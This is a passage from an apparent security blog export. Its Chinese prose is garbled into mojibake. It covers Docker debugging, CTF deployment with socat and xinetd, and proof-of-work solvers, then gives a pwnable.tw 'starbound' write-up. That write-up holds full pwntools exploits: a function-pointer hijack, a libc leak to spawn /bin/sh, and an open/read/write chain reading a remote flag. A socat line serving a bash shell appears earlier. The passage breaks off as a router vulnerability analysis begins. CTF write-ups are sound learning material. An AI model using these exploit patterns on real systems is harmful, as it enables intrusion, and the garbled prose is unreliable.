‡è¿›ç¨‹åœä¸‹æ¥ï¼šé€šè¿‡pythonè„šæœ¬è¿æ¥dockeræœåŠ¡ï¼Œå¹¶åœ¨è„šæœ¬ä¸­é€šè¿‡raw_input()åœä¸‹æ¥ï¼Œç»™gdbserverä¸€äº›æ—¶é—´attach\n\n   - ï¼ˆdockerå†…éƒ¨ï¼‰æŸ¥çœ‹ç›®æ ‡è¿›ç¨‹çš„pidï¼Œå¯åŠ¨gdbserverï¼Œattachåˆ°ç›®æ ‡è¿›ç¨‹ï¼š\n\n     ```\n     gdbserver :1234 --attach <pid>\n     ```\n\n   - ï¼ˆæœ¬åœ°ï¼‰å¯åŠ¨gdbï¼Œè¿æ¥è¿œç¨‹ç›®æ ‡ï¼š\n\n     ```\n     file <xxx>\n     target remote :1234\n     ```\n\n## æ‹‰å–dockerä¸­æ–‡ä»¶\n\næŸ¥çœ‹dockerçš„ container idï¼š\n\n```bash\ndocker container list\n```\n\nå°†dockerå†…æ–‡ä»¶æ‹‰å–è‡³æœ¬åœ°ï¼š\n\n```bash\ndocker cp <containerId>:/file/path/within/container /host/path/target\n```\n\nåœ¨pocè„šæœ¬ä¸­æŒ‡å®šå¦‚ä¸‹libcå’Œldï¼š\n\n```bash\nmyelf  = ELF(\"./note\")\nlibc Â  = ELF(\"./libc.so.6\")\nld Â  Â  = ELF(\"./ld-2.29.so\")\nio Â  Â  = process(argv=[ld.path,myelf.path],env={\"LD_PRELOAD\" : libc.path})\n```\n\n\n\n# ctf pwné¢˜éƒ¨ç½²å·¥å…·\n\n## socat\n\n> socatå¯ä»¥ä¸ºæ¯ä¸€ä¸ªè¿æ¥è€…æä¾›ä¸€ä¸ªç‹¬ç«‹çš„äºŒè¿›åˆ¶ç¨‹åºæ‰§è¡Œç¯å¢ƒ\n\n[æ–°ç‰ˆç‘å£«å†›åˆ€ï¼šsocat](https://zhuanlan.zhihu.com/p/347722248)\n\nsocatåŸºæœ¬ç”¨æ³•ï¼š\n\n```bash\nsocat - -              # æŠŠæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºå¯¹æ¥ï¼Œè¾“å…¥ä»€ä¹ˆæ˜¾ç¤ºä»€ä¹ˆ\n\n## ç½‘ç»œæµ‹è¯•\nsocat - TCP-LISTEN:8080               # ç»ˆç«¯1 ä¸Šå¯åŠ¨ server ç›‘å¬ TCP\nsocat - TCP:localhost:8080            # ç»ˆç«¯2 ä¸Šå¯åŠ¨ client é“¾æ¥ TCP\n\nsocat - TCP-LISTEN:8080,fork,reuseaddr      # ç»ˆç«¯1 ä¸Šå¯åŠ¨ server\nsocat - TCP:localhost:8080                  # ç»ˆç«¯2 ä¸Šå¯åŠ¨ client\n\nsocat - UDP-LISTEN:8080               # ç»ˆç«¯1 ä¸Šå¯åŠ¨ server ç›‘å¬ UDP\nsocat - UDP:localhost:8080            # ç»ˆç«¯2 ä¸Šå¯åŠ¨ client é“¾æ¥ UDP\n\n## ç«¯å£è½¬å‘\nsocat TCP-LISTEN:8080,fork,reuseaddr  TCP:192.168.1.3:80       # å°†8080ç«¯å£æ‰€æœ‰æµé‡è½¬å‘ç»™è¿œç¨‹æœºå™¨çš„ 80 ç«¯å£\n\n## è¿œç¨‹ç™»å½•\nsocat TCP-LISTEN:8080,fork,reuseaddr  EXEC:/usr/bin/bash    # æœåŠ¡ç«¯æä¾› shell\nsocat - TCP:localhost:8080                                  # å®¢æˆ·ç«¯ç™»å½•\n\n## ç½‘é¡µæœåŠ¡\nsocat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:\"bash web.sh\"\n\n## æ–‡ä»¶ä¼ è¾“\nsocat -u TCP-LISTEN:8080 open:record.log,create    # æœåŠ¡ç«¯æ¥æ”¶æ–‡ä»¶\nsocat -u open:record.log TCP:localhost:8080        # å®¢æˆ·ç«¯å‘é€æ–‡ä»¶\n\n## é€æ˜ä»£ç†\nsocat TCP-LISTEN:<æœ¬åœ°ç«¯å£>,reuseaddr,fork SOCKS:<ä»£ç†æœåŠ¡å™¨IP>:<è¿œç¨‹åœ°å€>:<è¿œç¨‹ç«¯å£>,socksport=<ä»£ç†æœåŠ¡å™¨ç«¯å£>\nsocat TCP-LISTEN:<æœ¬åœ°ç«¯å£>,reuseaddr,fork PROXY:<ä»£ç†æœåŠ¡å™¨IP>:<è¿œç¨‹åœ°å€>:<è¿œç¨‹ç«¯å£>,proxyport=<ä»£ç†æœåŠ¡å™¨ç«¯å£>\n```\n\n\n\n## xinetd\n\n> åœ¨å®ä½“æœºä¸Šéƒ¨ç½²éƒ¨åˆ†é¢˜ç›®æ—¶ï¼ˆå¦‚ä¸€äººèµ·ä¸€ä¸ªqemuï¼‰ï¼Œéœ€è¦ä½¿ç”¨xinetdæœåŠ¡\n\n### åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼šå¯åŠ¨ä¸€ä¸ªäºŒè¿›åˆ¶\n\né‚£ä¹ˆï¼Œå¯¹äºä¸€ä¸ªæ–°æ‰‹æ¥è¯´ï¼Œåº”è¯¥æ€æ ·å…¥é—¨xinetdçš„ä½¿ç”¨å‘¢ï¼Ÿè¿™é‡Œæˆ‘è®°å½•äº†å‡ ä¸ªé‡è¦çš„æ­¥éª¤ï¼š\n\n1. é¦–å…ˆï¼Œåº”å½“å†™å¥½æˆ‘ä»¬è¦è¿è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºã€‚æ ¹æ®å¤–æ¥çš„è¿æ¥è¯·æ±‚ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºå®ƒä»¬åˆ†åˆ«èµ·ä¸€ä¸ªæ–°çš„ç¨‹åºï¼Œç”¨äºäº¤äº’ã€‚è¿™é‡Œä»¥ä¸€ä¸ªç®€å•çš„æ‰“å°ç¨‹åºä¸ºä¾‹ã€‚\n\n   ```c\n   // gcc aaa.c -o aaa\n   #include<stdio.h>\n   int main(int argc, char *argv[]){\n   \tprintf(\"hello 1, %s\\n\",argv[0]);\n   \tfflush(stdout);\n   \tgetchar();\n   \tprintf(\"hello 2, %s\\n\",argv[1]);\n   \tfflush(stdout);\n   \tgetchar();\n   \tprintf(\"hello 3, %s\\n\",argv[2]);\n   \tfflush(stdout);\n   \tgetchar();\n   \treturn 0;\n   }\n   ```\n\n2. å®‰è£…xinetdï¼š`sudo apt install xinetd`\n\n3. xinetdçš„é…ç½®æ–‡ä»¶ä½äº`/etc/xinetd.d/`ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¯¥ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåå­—éšæ„\n\n   ```bash\n   # /etc/xinetd.d/test\n   service ctf\n   {\n       disable     = no\n       type        = UNLISTED\n       protocol    = tcp\n       socket_type = stream\n       port        = 9999\n       wait        = no\n   \n       server      = /home/bling/aaa\n       server_args = bbb ccc\n   \n       user        = root\n   }\n   ```\n\n4. é…ç½®æ–‡ä»¶ç¡®å®šæ— è¯¯åï¼Œå¯ä»¥é‡å¯ä¸€ä¸‹xinetdæœåŠ¡ï¼Œè®©é…ç½®ç”Ÿæ•ˆï¼š`/etc/init.d/xinetd restart`\n\n5. é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šäº†ç›‘å¬ç«¯å£ä¸º9999ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ä¸€ä¸‹è¿æ¥è¯¥ç«¯å£ï¼Œå¾—åˆ°äº†è·Ÿé¢„æœŸä¸€æ ·çš„è¾“å‡ºã€‚å¯ä»¥å¤šå¼€å‡ ä¸ªçª—å£è¿æ¥è¯•è¯•ï¼Œçœ‹çœ‹`netstat -pantu`çš„ç»“æœã€‚\n\n   ```bash\n   $ nc 127.0.0.1 9999\n   hello 1, aaa\n   \n   hello 2, bbb\n   \n   hello 3, ccc\n   ```\n\nä»¥ä¸Šå°±æ˜¯å¯¹xnetdçš„ç®€å•ä½¿ç”¨è¿‡ç¨‹ï¼Œæœ‰äº†åŸºç¡€æ¡†æ¶çš„äº†è§£ï¼Œåç»­åŸºäºæ­¤å†æ·»åŠ åŠŸèƒ½ä¹Ÿä¼šæ¸…æ™°å¾ˆå¤šã€‚\n\n\n\n### ä½¿ç”¨xinetdå¯åŠ¨å¤šä¸ªqemu\n\nå¯¹äºéœ€è¦å¯åŠ¨qemuçš„æƒ…å†µï¼Œç”±äºqemuå¯åŠ¨å‚æ•°è¾ƒå¤šï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š\n\n1. æ–°å»ºä¸€ä¸ªbashè„šæœ¬æ–‡ä»¶ï¼Œå°†å·¥ä½œç›®å½•åˆ‡æ¢åˆ°qemuè¿è¡Œæ‰€éœ€æ–‡ä»¶çš„ç›®å½•ï¼Œç„¶åæ‰§è¡Œqemuå‘½ä»¤ï¼ˆå¯è®¾ç½®timeout 120ï¼Œå°†æ¯ä¸ªqemuçš„è¿è¡Œæ—¶é—´é™åˆ¶åœ¨120så†…ï¼Œé˜²æ­¢é•¿æ—¶é—´è¿‡å¤šå ç”¨è®¡ç®—æœºèµ„æºï¼‰\n\n   ```bash\n   # start.sh\n   cd /home/bling/optee_v7/out/bin;\n   \n   timeout 120 /home/bling/optee_v7/qemu-system-arm  -nographic -smp 2 -machine virt,secure=on -cpu cortex-a15 -d unimp -semihosting-config enable=on,target=native -m 1057 -bios bl1.bin -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000 -netdev user,id=vmnic -device virtio-net-device,netdev=vmnic\n   ```\n\n2. å°†xinetdçš„é…ç½®æ–‡ä»¶çš„serverå’Œserver_argsæ”¹ä¸ºå¦‚ä¸‹è®¾ç½®ï¼Œè¿™æ ·xinetdæœåŠ¡restartåï¼Œæ¯å½“æœ‰æ–°è¿æ¥åˆ°9999ç«¯å£æ—¶ï¼Œå°±ä¼šä½¿ç”¨shç¨‹åºæ‰§è¡Œstart.shï¼Œå³å¯åŠ¨ä¸€ä¸ªqemu\n\n   ```bash\n   service ctf\n   {\n       disable     = yes\n       type        = UNLISTED\n       protocol    = tcp\n       socket_type = stream\n       port        = 9999\n       wait        = no\n           \n       server      = /bin/sh\n       server_args = /home/bling/start.sh\n   \n       user        = root\n   }\n   ```\n\nps. ctfä¸­å¯¹äºéœ€è¦å¯åŠ¨qemuçš„åœºæ™¯ï¼Œé€šå¸¸éœ€è¦é€‰æ‰‹å…ˆè¿‡ä¸€ä¸ªpowï¼Œç›®çš„æ˜¯å¹³è¡¡æœåŠ¡ç«¯çš„æ€§èƒ½ã€‚é‚£ä¹ˆéœ€è¦åœ¨ä¸Šæ–‡xinetdçš„é…ç½®æ–‡ä»¶ä¸­è°ƒç”¨`/usr/bin/python3 /xx/xx/xx/pow.py`ï¼Œé€šè¿‡pow.pyè„šæœ¬å†å»å¯åŠ¨qemuã€‚ä¸€ä¸ªå®é™…çš„ä¾‹å­å¯ä»¥å‚è€ƒæˆ‘å‡ºçš„opteeçš„é¢˜ï¼ˆåç»­ä¸Šä¼ äº†å†è´´è¿æ¥ï¼‰ã€‚\n\n### ctf pwnå¸¸ç”¨çš„ctf_xinetdæ¡†æ¶\n\nåœ¨Dockerä¸­éœ€è¦éƒ¨ç½²å¸¦chrootçš„xinetdæœåŠ¡æ—¶ï¼Œè€ƒè™‘ç›´æ¥ç”¨ctf_xinetdæ¨¡ç‰ˆ\n\n[github ctf_xinetd](https://github.com/Eadom/ctf_xinetd)\n\n[Pwnéƒ¨ç½²æ¡†æ¶ï¼Œå‡ºé¢˜ï¼ˆubuntuï¼‰](https://blog.csdn.net/YangZiTrick/article/details/109474241)\n\nç°åœ¨å¤§éƒ¨åˆ†é¢˜ç›®ï¼Œéƒ½æ˜¯åˆ©ç”¨xinetd+docker-composeæ¥å¿«é€Ÿå¸ƒç½®dockeré¢˜ç›®ç¯å¢ƒ\n\n- docker-composeç”¨äºç”Ÿæˆdocker imageå¹¶å¯åŠ¨dockerå®¹å™¨\n- xinetdåœ¨å®¹å™¨ä¸­ï¼Œå½“å®¹å™¨å¼€å§‹è¿è¡Œåï¼Œå®ƒæ ¹æ®é…ç½®æ‹‰èµ·å¯¹åº”çš„ç¨‹åºï¼Œå¹¶å……å½“socatçš„åŠŸèƒ½\n\nä½¿ç”¨æ–¹æ³•ï¼š\n\n- å°†ctf_xinetdç›®å½•ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶æ›´æ”¹\n- å¢åŠ docker-compose.ymlï¼Œå¹¶é…ç½®\n- é€šè¿‡ `docker-compose up -d` å°±èƒ½å¯åŠ¨å®¹å™¨+å¯åŠ¨å®¹å™¨å†…çš„äºŒè¿›åˆ¶ç¨‹åº\n\n\n\n# POW\n\n## å‡ºé¢˜æ—¶ç”¨åˆ°çš„\n\nå¾…è¡¥å……...\n\n## è§£é¢˜æ—¶ç”¨åˆ°çš„\n\n### è‡ªç ”å¤šè¿›ç¨‹æš´ç ´ç‰ˆ\n\nä½¿ç”¨multiprocessingä¸­çš„poolï¼Œå‚è€ƒ[å»–é›ªå³°è€å¸ˆçš„åšå®¢](https://www.liaoxuefeng.com/wiki/897692888725344/923056295693632)\n\nä¸€ä¸ªctfé¢˜çš„ä¾‹å­ï¼š`python3 this.py tkhYS 26`\n\nä»¥åç¢°åˆ°éœ€è¦å¤šè¿›ç¨‹è·‘çš„é¢˜ç›®ï¼Œæ”¹æ”¹å‚æ•°å¤„ç†ï¼Œis_validï¼Œcalc_startå‡½æ•°å°±è¡Œ\n\n```python\n# this.py\nfrom multiprocessing import Pool\nimport os\nimport sys\nimport time\nimport hashlib\n\nprefix = sys.argv[1]\ndifficulty = int(sys.argv[2])\nzeros = '0' * difficulty\n\ndef is_valid(digest):\n    if sys.version_info.major == 2:\n        digest = [ord(i) for i in digest]\n    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)\n    return bits[:difficulty] == zeros\n\ndef calc_start(count,end):\n    time1 = time.time()\n    while True:\n        if count >= end:\n            print(\"exceed,count is %d\" % count)\n            break\n        s = prefix + str(count)\n        if is_valid(hashlib.sha256(s.encode()).digest()):\n            time2 = time.time()\n            time3 = time2 - time1\n            print(count)\n            print(time3)\n            break\n        count +=1\n\npool = Pool()\n\n# pool.apply_async(calc_start, [0,100000,])\npool.apply_async(calc_start, [0,2500000,])\npool.apply_async(calc_start,[2500000,5000000])\npool.apply_async(calc_start,[5000000,7500000])\npool.apply_async(calc_start,[7500000,10000000])\npool.apply_async(calc_start,[10000000,12500000])\npool.apply_async(calc_start,[12500000,15000000])\npool.apply_async(calc_start,[15000000,17500000])\npool.apply_async(calc_start,[17500000,20000000])\npool.apply_async(calc_start,[20000000,22500000])\npool.apply_async(calc_start,[22500000,25000000])\npool.apply_async(calc_start,[25000000,27500000])\npool.apply_async(calc_start,[27500000,30000000])\npool.apply_async(calc_start,[30000000,32500000])\npool.apply_async(calc_start,[32500000,35000000])\npool.apply_async(calc_start,[35000000,37500000])\npool.apply_async(calc_start,[37500000,40000000])\npool.apply_async(calc_start,[40000000,42500000])\n\nprint(\"---start----\")\npool.close() \npool.join() \nprint(\"---end----\")\n```\n\n\n\n### æ¯”èµ›æ—¶é•¿äº­ç»™çš„ç‰ˆæœ¬\n\n```python\n# python3 proof_of_work.py xxxx 26\nimport string\nimport sys\nfrom hashlib import sha256\nfrom itertools import chain, product\nfrom multiprocessing import Pool\n\nsalt = None\nhard_bit = 0\n\ndef challenge(c):\n    s = sha256(salt + ''.join(c).encode()).hexdigest()\n    h = int(s, 16)\n    if h >> (256 - hard_bit) == 0:\n        return ''.join(c)\n    return None\n\ndef solve():\n    all_case = chain.from_iterable(map(lambda x: product(string.ascii_letters, repeat=x), range(10)))\n    with Pool() as p:\n        m = p.imap(challenge, all_case, 1000)\n        return next(filter(lambda x: x != None, m))\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(f\"{sys.argv[0]} salt hard_bit\")\n        exit(0)\n    salt = sys.argv[1].encode()\n    hard_bit = int(sys.argv[2])\n    print(f\"result: {solve()}\")\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"pwnable.twä¹‹starbound","url":"/2021/10/02/starbound/","content":"\n\n\né¢˜ç›®äºŒè¿›åˆ¶æ–‡ä»¶ï¼š[starbound](https://pwnable.tw/static/chall/starbound)\n\n# æ¼æ´åˆ†æ\n\nä»¥ä¸‹æ˜¯starboundçš„mainå‡½æ•°ï¼Œv3æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œè¢«ç”¨ä½œæ•°ç»„indexè€Œæœªæå‰åšæ£€æŸ¥ï¼Œå› æ­¤å­˜åœ¨æ•°ç»„è¶Šç•Œæ¼æ´ã€‚\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  char nptr[256]; // [esp+10h] [ebp-104h] BYREF\n\n  init();\n  while ( 1 )\n  {\n    dword_805817C(60);\n    if ( !readn(nptr, 0x100u) )\n      break;\n    v3 = strtol(nptr, 0u, 10);\n    if ( !v3 )\n      break;\n    ((void (*)(void))dword_8058154[v3])();\n  }\n  do_bye();\n  return 0;\n}\n```\n\ndword_8058154æ˜¯bssæ®µçš„åœ°å€ï¼Œè¿™é™„è¿‘å­˜æ”¾äº†è®¸å¤šå‡½æ•°æŒ‡é’ˆã€‚\n\n```c\nint show_main_menu()\n{\n  int result; // eax\n\n  puts(\"\\n-+STARBOUND v1.0+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Info\");\n  puts(\"  2. Move\");\n  puts(\"  3. View\");\n  puts(\"  4. Tools\");\n  puts(\"  5. Kill\");\n  puts(\"  6. Settings\");\n  puts(\"  7. Multiplayer\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_info;\n  dword_805815C = (int)cmd_move;\n  dword_8058160 = (int)cmd_view;\n  dword_8058164 = (int)cmd_build;\n  dword_8058168 = (int)cmd_kill;\n  dword_805816C = (int)cmd_settings;\n  dword_8058170 = (int)cmd_multiplayer;\n  return result;\n}\n```\n\nè€ƒè™‘é€šè¿‡æ•°ç»„è¶Šç•Œè®¿é—®åˆ°ä¸€äº›æ¶æ„æ„é€ çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½åŠ«æŒæ§åˆ¶æµã€‚\n\nç»§ç»­åˆ†æç¨‹åºåˆ†æ”¯ï¼Œshow_main_menu() â€”> cmd_settings() â€”> show_settings_menu() â€”> cmd_set_name()ä¸­ï¼Œbyte_80580D0ä¹Ÿæ˜¯bssæ®µçš„åœ°å€ï¼Œä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶å†…å®¹ã€‚\n\n```c\nvoid cmd_go_back()\n{\n  dword_805817C = show_main_menu;\n}\n\nint show_main_menu()\n{\n  int result; // eax\n\n  puts(\"\\n-+STARBOUND v1.0+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Info\");\n  puts(\"  2. Move\");\n  puts(\"  3. View\");\n  puts(\"  4. Tools\");\n  puts(\"  5. Kill\");\n  puts(\"  6. Settings\");\n  puts(\"  7. Multiplayer\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_info;\n  dword_805815C = (int)cmd_move;\n  dword_8058160 = (int)cmd_view;\n  dword_8058164 = (int)cmd_build;\n  dword_8058168 = (int)cmd_kill;\n  dword_805816C = (int)cmd_settings;\n  dword_8058170 = (int)cmd_multiplayer;\n  return result;\n}\n\nvoid cmd_settings()\n{\n  dword_805817C = show_settings_menu;\n}\n\nint show_settings_menu()\n{\n  int result; // eax\n\n  if ( dword_80580CC )\n    cmd_view();\n  puts(\"\\n-+STARBOUND v1.0: SETTINGS+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Back\");\n  puts(\"  2. Name\");\n  puts(\"  3. IP\");\n  puts(\"  4. Toggle View\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_go_back;\n  dword_805815C = (int)cmd_set_name;\n  dword_8058160 = (int)cmd_set_ip;\n  dword_8058164 = (int)cmd_set_autoview;\n  return result;\n}\n\nint cmd_set_name()\n{\n  int result; // eax\n\n  __printf_chk(1, \"Enter your name: \");\n  result = readn(byte_80580D0, 100u);\n  *(_BYTE *)(result + 0x80580CF) = 0;\n  return result;\n}\n```\n\nè®¡ç®—ä¸€ä¸‹byte_80580D0ä¸dword_8058154ä¸¤è€…çš„è·ç¦»ï¼Œå› æ­¤é€šè¿‡dword_8058154[-33]å³å¯è®¿é—®åˆ°byte_80580D0åœ°å€å­˜æ”¾çš„å†…å®¹ã€‚æ­¤æ—¶å·²å®ç°æ§åˆ¶æµåŠ«æŒã€‚\n\n```python\n>>> hex(0x8058154-0x80580D0)\n'0x84'\n```\n\n# æ¼æ´åˆ©ç”¨\n\nç¨‹åºä¸­ï¼š\n\n- æ²¡æœ‰åé—¨å‡½æ•°\n- æ²¡æœ‰systemæˆ–execveå‡½æ•°\n- æ²¡æœ‰int 80æˆ–syscallæŒ‡ä»¤\n- æ²¡æœ‰â€œ/bin/shâ€å­—ç¬¦ä¸²\n- æ²¡æœ‰ç»™libc\n\n## æ–¹æ³•1ï¼šæ³„éœ²libcç‰ˆæœ¬\n\né¦–å…ˆæƒ³åˆ°çš„æ˜¯ï¼Œé€šè¿‡æ³„éœ²libcç‰ˆæœ¬ï¼Œè¿›è€Œæ‰§è¡Œone_gadgetæˆ–æ„é€ system(\"/bin/sh\")è¿™ç§æ–¹æ³•ã€‚\n\nexpå¦‚ä¸‹ï¼Œè¯¥æ–¹æ³•åœ¨æœ¬åœ°èƒ½æˆåŠŸã€‚ä½†æ˜¯åœ¨æ³„éœ²è¿œç¨‹libcç‰ˆæœ¬æ—¶ï¼Œå‘ç°æ³„éœ²ä¸åŒå‡½æ•°ä¼šå¾—åˆ°ä¸åŒlibcç‰ˆæœ¬ã€‚çŒœæµ‹è¿œç¨‹libcæ˜¯ç‰¹æ„æ”¹è¿‡çš„ï¼Œæ— æ³•ç”¨è¿™ç§æ–¹æ³•å‡†ç¡®è·å¾—systemå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼Œæ•…æœ¬é¢˜æ”¾å¼ƒä½¿ç”¨è¯¥æ–¹æ³•ã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nlibc_elf = ELF(\"./libc-2.27.so\")\nio = process(\"./starbound\")\n# io = remote(\"chall.pwnable.tw\",10202)\n\n# io.recvuntil(\"Landing ...\")\n# gdb.attach(io,\"b *0x804A659 \\n c\")\n\n### 1ã€å¾€byte_80580D0ä½ç½®å†™å…¥ç›®çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿™é‡Œé€‰0x08048e48å…ˆè°ƒæ•´ä¸€ä¸‹æ ˆç©ºé—´ï¼Œæ–¹ä¾¿2çš„åˆ©ç”¨\nio.recvuntil(\"> \")\nio.sendline(str(6))\nio.recvuntil(\"> \")\nio.sendline(str(2))\nname_e = p32(0x08048e48) \n# 0x08048e48 : add esp, 0x1c ; ret      \n# 0x08048936 : add esp, 8 ; pop ebx ; ret\n\n# printf_chk@plt 0x80489F0\nio.recvuntil(\"name: \")\nio.sendline(name_e)\n\n### 2ã€æ ¹æ®æ­¤æ—¶æ ˆç©ºé—´çš„æƒ…å†µï¼Œæ„é€ äº†å¦‚ä¸‹payloadã€‚å½“1ä¸­gadgetæ‰§è¡Œå®Œè¿”å›åï¼Œä¼šæ‰§è¡Œputs(read@got)\n### ç„¶åå†æ¬¡è¿”å›åˆ°0x804A605(mainå¼€å¤´)ã€‚æ­¤æ—¶æ³„éœ²äº†readå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œå¹¶æ‹¥æœ‰é‡æ–°ä»mainå‡½æ•°æ‰§è¡Œçš„èƒ½åŠ›\npayload = '-33\\x00'+'aaaa'+p32(0x8048b90)+p32(0x804A605)+p32(0x8055054)\n# puts@plt 0x8048b90\n# write@got 0x8055044  --\n# puts@got 0x805509C\n# read@got 0x8055054\nio.recvuntil(\"> \")\nio.sendline(payload)\n\nread_addr = u32(io.recv(4))\nprint \"!!!!read!!!!!\"\nprint hex(read_addr)\nlibc_base = read_addr - libc_elf.symbols[\"read\"] \nsystem_addr = libc_base + libc_elf.symbols[\"system\"]\nprint \"!!!!libc_base!!!!\"\nprint hex(libc_base)\nprint \"!!!!system!!!!\"\nprint hex(system_addr)\n\n### 3ã€åŠ«æŒæ§åˆ¶æµä»¥æ‰§è¡Œsystem(\" -33;/bin/sh\\x00\")\nio.recvuntil(\"> \")\nio.sendline(str(6))\nio.recvuntil(\"> \")\nio.sendline(str(2))\nname_e = p32(system_addr)\nio.recvuntil(\"name: \")\nio.sendline(name_e)\npayload = \" -33;/bin/sh\\x00\"     # ç›¸å½“äºå‘½ä»¤æ³¨å…¥ã€‚é€šè¿‡å°è¯•ï¼Œåœ¨-33å‰åŠ å…¥ç©ºæ ¼æ‰èƒ½åˆ©ç”¨æˆåŠŸ\nio.recvuntil(\"> \")\nio.sendline(payload)\nio.interactive()\n```\n\n## æ–¹æ³•2ï¼šORW\n\nåœ¨ç¨‹åºgotè¡¨ä¸­çœ‹äº†çœ‹ï¼Œå‘ç°æœ‰æ­£å¥½æœ‰openã€readã€writeä¸‰ä¸ªå‡½æ•°ï¼è¿™æ­£å¥½å¯ä»¥æ„é€ orwï¼å½“ç„¶åœ¨ä¸çŸ¥flagç›®å½•çš„å‰æä¸‹æœ‰ç‚¹éš¾åº¦ï¼Œä¸è¿‡pwnable.twçš„flagä¸€èˆ¬åœ¨/home/é¢˜ç›®å/flagï¼Œæ‰€ä»¥è¿™é‡Œå–ä¸ªå·§ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œctfé¢˜ç›®ä¸­ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç¨‹åºä¸­ä¸ä¼šæ‰“å¼€å…¶ä»–æ–‡ä»¶ï¼Œå› æ­¤è¿›ç¨‹åªæœ‰0 1 2 (stdinï¼Œstdoutï¼Œstderr)è¿™ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨openæ‰“å¼€æ–‡ä»¶åï¼Œå…¶fdä¸€å®šæ˜¯3ã€‚\n\nå¦‚æœç¨‹åºä¸­æ‰“å¼€äº†å…¶ä»–æ–‡ä»¶ï¼Œä¾æ¬¡å°è¯•ä¸‹4/5/6å°±è¡Œã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\n# io = process(\"./starbound\")\nio = remote(\"chall.pwnable.tw\",10202)\n\n# io.recvuntil(\"Landing ...\")\n# # gdb.attach(io,\"b *0x804A659 \\n c\")\n# gdb.attach(io,\"b open \\n c\")\n\ndef send_payload(val1,val2):\n    io.recvuntil(\"> \")\n    io.sendline(str(6))\n    io.recvuntil(\"> \")\n    io.sendline(str(2))\n    name_e = val1\n    io.recvuntil(\"name: \")\n    io.sendline(name_e)\n    payload = val2\n    io.recvuntil(\"> \")\n    io.sendline(payload)\n\n### open(\"/home/starbound/flag\",0)\nval1 = p32(0x08048e48)+\"/home/starbound/flag\\x00\"\nval2 = '-33\\x00'+'aaaa'+p32(0x8048970)+p32(0x804A605)+p32(0x80580D4)+p32(0)\nsend_payload(val1,val2)\n\n### read(3,0x80580F0,0x30)\nval1 = p32(0x08048e48)\nval2 = '-33\\x00'+'aaaa'+p32(0x8048A70)+p32(0x804A605)+p32(3)+p32(0x80580F0)+p32(0x30)\nsend_payload(val1,val2)\n\n### write(1,0x8058F0,0x30)\nval1 = p32(0x08048e48)\nval2 = '-33\\x00'+'aaaa'+p32(0x8048A30)+p32(0x804A605)+p32(1)+p32(0x80580F0)+p32(0x30)\nsend_payload(val1,val2)\n\n### æ”¶flagï¼\nflag = io.recv(0x20)\nprint flag\n\nio.recvuntil(\">\")\nio.interactive()\n```\n\n## æ–¹æ³•3ï¼šret2dl_runtime_resolve\n\nçœ‹äº†åˆ«äººçš„wpï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨è¿™ç§æ–¹æ³•æ¥åšçš„ã€‚è¿™ç§æ–¹æ³•æ¯”è¾ƒä¿é™©ï¼Œä½†æ˜¯è¿‡ç¨‹æœ‰ç‚¹å¤æ‚ã€‚\n\nçŠ¯æ‡’äº†ï¼Œå“ªå¤©æƒ³èµ·æ¥å†è¡¥ä¸Šå§~\n","categories":["CTF"]},{"title":"TOTOLINK T10æ—§ç‰ˆæœ¬æ¼æ´æŒ–æ˜å’Œåˆ†æ","url":"/2021/09/25/analysis-of-totolink-t10/","content":"\n# å¼€å¤´ä¸‰æ­¥æ›²\n\n## è¿è¡Œè¯•è¯•\n\næ‹¿åˆ°è®¾å¤‡åï¼Œç¬¬ä¸€ä»¶äº‹å½“ç„¶æ˜¯è·‘èµ·æ¥çœ‹çœ‹ã€‚\n\næœ¬æ¬¡æŒ–æ´ç»ƒä¹ çš„ç›®æ 